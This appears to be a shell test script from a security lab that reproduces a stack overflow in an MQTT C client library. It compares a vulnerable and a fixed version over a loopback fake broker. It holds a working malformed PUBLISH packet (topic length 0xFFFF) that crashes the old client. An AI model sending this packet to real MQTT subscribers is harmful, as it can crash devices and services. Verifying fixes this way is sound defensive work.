#!/bin/sh
# Frontier lab: verbatim shipped simple_subscriber.c publish_callback against
# verbatim pinned mqtt.c, driven by bytes from a 127.0.0.1 fake broker.
# The callback is extracted from the pinned tarball with awk (no edits); only
# the socket setup, PAL and main() are lab-only. No external host, no command.
set -u
cd "$(dirname "$0")" || exit 2

VULN_TAR="src/mqtt-1.1.6.tar.gz"
FIX_TAR="src/mqtt-1.1.7.tar.gz"
VULN_TAR_SHA="fad0b15f3f58317dd3b0399b37efab7c582074744871f093b9fdf28c74667f7d"
FIX_TAR_SHA="1e5d8a91d312724ceea4fe183680cabfdd47a10b5cf28e3834a8bec66e89e02c"
VULN_SRC_SHA="34ee9f4d573b2ac8c627c966c0112eb54f8620023f25d9cbeebb92e713a8e741"
FIX_SRC_SHA="d8f3f8cabe8ee5edcd80acfef75f7ee0f345751832a895d4cdc99dff6be1cfde"
SHIPPED_EX_SHA="4df4f527d04e02f6d84b59084437e0dccba04770eeaa93424e0acf2fd1035eac"
CALLBACK_SHA="ed395acf8b86a7f02006bf3b8cf12442c1ad81b9fd569f2ae82197c4fe20c60c"
ATTACK="3004ffff0000"          # QoS0 PUBLISH, remaining_length=4, topic size 0xFFFF
SAFE="3006000161626300"        # QoS0 PUBLISH, topic "a", payload "bc"
PASS=0
FAIL=0

sha() { sha256sum "$1" | cut -d' ' -f1; }
ok()   { PASS=$((PASS + 1)); echo "PASS $1"; }
bad()  { FAIL=$((FAIL + 1)); echo "FAIL $1"; }
expect_eq() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got '$2' want '$3')"; fi; }
has() { grep -q "$2" "$1" && ok "$3" || bad "$3"; }
hasnt() { grep -q "$2" "$1" && bad "$3" || ok "$3"; }

for pair in "$VULN_TAR:$VULN_TAR_SHA" "$FIX_TAR:$FIX_TAR_SHA"; do
    tar=${pair%%:*}
    want=${pair#*:}
    expect_eq "$tar sha256" "$(sha "$tar")" "$want"
done

rm -rf build-realconsumer
mkdir -p build-realconsumer/vuln build-realconsumer/fixed build-realconsumer/callback
tar xzf "$VULN_TAR" -C build-realconsumer/vuln --strip-components=1 \
    MQTT-C-1.1.6/src/mqtt.c MQTT-C-1.1.6/include/mqtt.h MQTT-C-1.1.6/include/mqtt_pal.h
tar xzf "$FIX_TAR" -C build-realconsumer/fixed --strip-components=1 \
    MQTT-C-1.1.7/src/mqtt.c MQTT-C-1.1.7/include/mqtt.h MQTT-C-1.1.7/include/mqtt_pal.h
expect_eq "vulnerable mqtt.c verbatim sha256" "$(sha build-realconsumer/vuln/src/mqtt.c)" "$VULN_SRC_SHA"
expect_eq "fixed mqtt.c verbatim sha256" "$(sha build-realconsumer/fixed/src/mqtt.c)" "$FIX_SRC_SHA"

tar xzf "$VULN_TAR" -C build-realconsumer/callback --strip-components=1 \
    MQTT-C-1.1.6/examples/simple_subscriber.c
expect_eq "shipped simple_subscriber.c verbatim sha256" \
    "$(sha build-realconsumer/callback/examples/simple_subscriber.c)" "$SHIPPED_EX_SHA"
awk '/^void publish_callback\(void\*\* unused, struct mqtt_response_publish \*published\)$/{f=1} f{print} f && /^}$/{exit}' \
    build-realconsumer/callback/examples/simple_subscriber.c > build-realconsumer/callback/callback.inc
expect_eq "verbatim shipped callback.inc sha256" "$(sha build-realconsumer/callback/callback.inc)" "$CALLBACK_SHA"

CC=${CC:-gcc}
CFLAGS="-std=c99 -O0 -g -fno-omit-frame-pointer -pthread"
ASAN="-fsanitize=address"
for side in vuln fixed; do
    cp build-realconsumer/callback/callback.inc build-realconsumer/$side/callback.inc
    if $CC $CFLAGS $ASAN -Ibuild-realconsumer/$side/include -Ibuild-realconsumer/$side \
        harness/real_callback_driver.c build-realconsumer/$side/src/mqtt.c \
        -o build-realconsumer/$side/asan > build-realconsumer/$side/asan-build.log 2>&1; then
        ok "$side shipped-callback ASan build"
    else
        bad "$side shipped-callback ASan build"
    fi
    if $CC $CFLAGS -Ibuild-realconsumer/$side/include -Ibuild-realconsumer/$side \
        harness/real_callback_driver.c build-realconsumer/$side/src/mqtt.c \
        -o build-realconsumer/$side/plain > build-realconsumer/$side/plain-build.log 2>&1; then
        ok "$side shipped-callback plain build"
    else
        bad "$side shipped-callback plain build"
    fi
done

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0

./build-realconsumer/vuln/asan "$ATTACK" > build-realconsumer/vuln/asan-attack.log 2>&1
has build-realconsumer/vuln/asan-attack.log 'CLIENT connect=127.0.0.1:' 'vuln attack client connected to loopback broker'
has build-realconsumer/vuln/asan-attack.log 'PAL_RECV fd=.*bufsz=1024' 'vuln attack uses shipped 1024-byte receive buffer'
has build-realconsumer/vuln/asan-attack.log 'PAL_RECV fd=.*rv=3 bufsz=1024' 'vuln attack first 3 bytes came from recv()'
has build-realconsumer/vuln/asan-attack.log 'PAL_RECV fd=.*rv=3 bufsz=1021' 'vuln attack second chunk consumed from recv()'
has build-realconsumer/vuln/asan-attack.log 'AddressSanitizer: stack-buffer-overflow' 'vuln attack ASan stack-buffer-overflow'
has build-realconsumer/vuln/asan-attack.log 'READ of size 65535' 'vuln attack ASan READ of 65535 bytes'
has build-realconsumer/vuln/asan-attack.log 'publish_callback build-realconsumer/vuln/callback.inc:5' \
    'vuln attack ASan frame at verbatim shipped callback memcpy (simple_subscriber.c:127)'
has build-realconsumer/vuln/asan-attack.log '__mqtt_recv build-realconsumer/vuln/src/mqtt.c:760' \
    'vuln attack ASan frame at verbatim mqtt.c:760 callback dispatch'
has build-realconsumer/vuln/asan-attack.log 'WIRE_CHILD_STATUS exited=1 code=1 signal=-1' 'vuln attack child faulted under ASan'

./build-realconsumer/vuln/plain "$ATTACK" > build-realconsumer/vuln/plain-attack.log 2>&1
has build-realconsumer/vuln/plain-attack.log 'WIRE_CHILD_STATUS exited=0 code=-1 signal=11' \
    'vuln plain shipped-callback child SIGSEGV'

./build-realconsumer/fixed/asan "$ATTACK" > build-realconsumer/fixed/asan-attack.log 2>&1
has build-realconsumer/fixed/asan-attack.log 'RECV2 rv=-2147483636 error=-2147483636' \
    'fixed attack rejects malformed PUBLISH from wire'
hasnt build-realconsumer/fixed/asan-attack.log 'Received publish' 'fixed attack never called the shipped callback'
has build-realconsumer/fixed/asan-attack.log 'WIRE_CHILD_STATUS exited=1 code=0 signal=-1' 'fixed attack child clean exit'
hasnt build-realconsumer/fixed/asan-attack.log AddressSanitizer 'fixed attack no ASan report'

./build-realconsumer/vuln/asan "$SAFE" > build-realconsumer/vuln/asan-safe.log 2>&1
has build-realconsumer/vuln/asan-safe.log "Received publish('a'): bc" 'safe packet shipped callback printed topic and payload'
has build-realconsumer/vuln/asan-safe.log 'RECV2 rv=1 error=-2147483633' 'safe packet normal wire parse'
hasnt build-realconsumer/vuln/asan-safe.log AddressSanitizer 'safe packet no ASan report'

echo "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
